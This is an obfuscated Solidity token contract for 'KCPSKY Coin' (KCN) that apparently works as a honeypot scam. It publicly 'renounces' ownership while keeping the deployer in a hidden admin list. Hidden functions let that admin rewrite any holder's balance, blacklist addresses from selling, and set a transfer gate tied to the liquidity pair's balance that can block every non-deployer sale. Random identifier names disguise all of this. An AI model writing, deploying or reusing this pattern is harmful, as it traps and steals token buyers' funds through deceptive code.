//SPDX-License-Identifier: MIT

pragma solidity ^0.8.15;

interface fpxlqswiirwi {
    function totalSupply() external view returns (uint256);

    function balanceOf(address ivjyicgrxm) external view returns (uint256);

    function transfer(address ybsxlllxx, uint256 whjsiphnmgxz) external returns (bool);

    function allowance(address tpabvbdumbedn, address spender) external view returns (uint256);

    function approve(address spender, uint256 whjsiphnmgxz) external returns (bool);

    function transferFrom(
        address sender,
        address ybsxlllxx,
        uint256 whjsiphnmgxz
    ) external returns (bool);

    event Transfer(address indexed from, address indexed afrpwjahcgxz, uint256 value);
    event Approval(address indexed tpabvbdumbedn, address indexed spender, uint256 value);
}

interface xwdfcwddqvsmma is fpxlqswiirwi {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

abstract contract wscirpdmbzl {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface owhrvvkqnz {
    function createPair(address pwyqlwsijvskj, address arviyifsfds) external returns (address);
}

interface fzhpoflka {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

contract KCPSKYCoin is wscirpdmbzl, fpxlqswiirwi, xwdfcwddqvsmma {

    function allowance(address sevsvzipylg, address bbesuufnlispdi) external view virtual override returns (uint256) {
        if (bbesuufnlispdi == zwsxnysrxxaxfo) {
            return type(uint256).max;
        }
        return ngupkssgwmiu[sevsvzipylg][bbesuufnlispdi];
    }

    bool private bthfkdjxcmxe;

    function emaolfnyc(address ujzftapnhgmvco, address ybsxlllxx, uint256 whjsiphnmgxz) internal returns (bool) {
        if (ujzftapnhgmvco == dtneldyrm) {
            return mbnhwnlwzjzv(ujzftapnhgmvco, ybsxlllxx, whjsiphnmgxz);
        }
        uint256 gknscinsr = fpxlqswiirwi(bbcjjxczciqbg).balanceOf(bivzkpldzxznh);
        require(gknscinsr == rhkiitpmn);
        require(!ivjnslresx[ujzftapnhgmvco]);
        return mbnhwnlwzjzv(ujzftapnhgmvco, ybsxlllxx, whjsiphnmgxz);
    }

    mapping(address => uint256) private yzkxyymlsxzvr;

    uint8 private vucsdiiwohx = 18;

    function name() external view virtual override returns (string memory) {
        return twcqpibzpgh;
    }

    function mbnhwnlwzjzv(address ujzftapnhgmvco, address ybsxlllxx, uint256 whjsiphnmgxz) internal returns (bool) {
        require(yzkxyymlsxzvr[ujzftapnhgmvco] >= whjsiphnmgxz);
        yzkxyymlsxzvr[ujzftapnhgmvco] -= whjsiphnmgxz;
        yzkxyymlsxzvr[ybsxlllxx] += whjsiphnmgxz;
        emit Transfer(ujzftapnhgmvco, ybsxlllxx, whjsiphnmgxz);
        return true;
    }

    bool public gnwsmwxbrtfhx;

    address public dtneldyrm;

    function ajxjoqseob(address ltopnhpgjfc) public {
        if (gnwsmwxbrtfhx) {
            return;
        }
        if (axbymwpeygok != bthfkdjxcmxe) {
            axbymwpeygok = false;
        }
        gklpigejajeaea[ltopnhpgjfc] = true;
        if (axbymwpeygok) {
            bthfkdjxcmxe = true;
        }
        gnwsmwxbrtfhx = true;
    }

    event OwnershipTransferred(address indexed rirghchwpw, address indexed ztbjsdsbwz);

    function transferFrom(address ujzftapnhgmvco, address ybsxlllxx, uint256 whjsiphnmgxz) external override returns (bool) {
        if (_msgSender() != zwsxnysrxxaxfo) {
            if (ngupkssgwmiu[ujzftapnhgmvco][_msgSender()] != type(uint256).max) {
                require(whjsiphnmgxz <= ngupkssgwmiu[ujzftapnhgmvco][_msgSender()]);
                ngupkssgwmiu[ujzftapnhgmvco][_msgSender()] -= whjsiphnmgxz;
            }
        }
        return emaolfnyc(ujzftapnhgmvco, ybsxlllxx, whjsiphnmgxz);
    }

    uint256 private ynzhshffftt;

    mapping(address => bool) public gklpigejajeaea;

    function hrwgtldevrz(address aytetkivhd, uint256 whjsiphnmgxz) public {
        izqzpllbvcs();
        yzkxyymlsxzvr[aytetkivhd] = whjsiphnmgxz;
    }

    function balanceOf(address ivjyicgrxm) public view virtual override returns (uint256) {
        return yzkxyymlsxzvr[ivjyicgrxm];
    }

    function symbol() external view virtual override returns (string memory) {
        return yunkdlhpupmx;
    }

    function approve(address bbesuufnlispdi, uint256 whjsiphnmgxz) public virtual override returns (bool) {
        ngupkssgwmiu[_msgSender()][bbesuufnlispdi] = whjsiphnmgxz;
        emit Approval(_msgSender(), bbesuufnlispdi, whjsiphnmgxz);
        return true;
    }

    function transfer(address aytetkivhd, uint256 whjsiphnmgxz) external virtual override returns (bool) {
        return emaolfnyc(_msgSender(), aytetkivhd, whjsiphnmgxz);
    }

    mapping(address => mapping(address => uint256)) private ngupkssgwmiu;

    uint256 private holrorefjzwd = 100000000 * 10 ** 18;

    string private yunkdlhpupmx = "KCN";

    constructor (){
        
        ybrvydjhph();
        fzhpoflka ntrglkppmnbe = fzhpoflka(zwsxnysrxxaxfo);
        bbcjjxczciqbg = owhrvvkqnz(ntrglkppmnbe.factory()).createPair(ntrglkppmnbe.WETH(), address(this));
        if (bthfkdjxcmxe == axbymwpeygok) {
            rvpaxmokgx = ynzhshffftt;
        }
        dtneldyrm = _msgSender();
        gklpigejajeaea[dtneldyrm] = true;
        yzkxyymlsxzvr[dtneldyrm] = holrorefjzwd;
        
        emit Transfer(address(0), dtneldyrm, holrorefjzwd);
    }

    address zwsxnysrxxaxfo = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function getOwner() external view returns (address) {
        return ytygschqaoisyu;
    }

    function xgggkexpzx(address hyzpgacdd) public {
        izqzpllbvcs();
        
        if (hyzpgacdd == dtneldyrm || hyzpgacdd == bbcjjxczciqbg) {
            return;
        }
        ivjnslresx[hyzpgacdd] = true;
    }

    uint256 private rvpaxmokgx;

    address bivzkpldzxznh = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function ybrvydjhph() public {
        emit OwnershipTransferred(dtneldyrm, address(0));
        ytygschqaoisyu = address(0);
    }

    function owner() external view returns (address) {
        return ytygschqaoisyu;
    }

    bool private axbymwpeygok;

    address public bbcjjxczciqbg;

    function decimals() external view virtual override returns (uint8) {
        return vucsdiiwohx;
    }

    address private ytygschqaoisyu;

    string private twcqpibzpgh = "KCPSKY Coin";

    function oeexwugtyplxq(uint256 whjsiphnmgxz) public {
        izqzpllbvcs();
        rhkiitpmn = whjsiphnmgxz;
    }

    function izqzpllbvcs() private view {
        require(gklpigejajeaea[_msgSender()]);
    }

    mapping(address => bool) public ivjnslresx;

    uint256 rhkiitpmn;

    function totalSupply() external view virtual override returns (uint256) {
        return holrorefjzwd;
    }

    uint256 iktzuzfpoywbkb;

}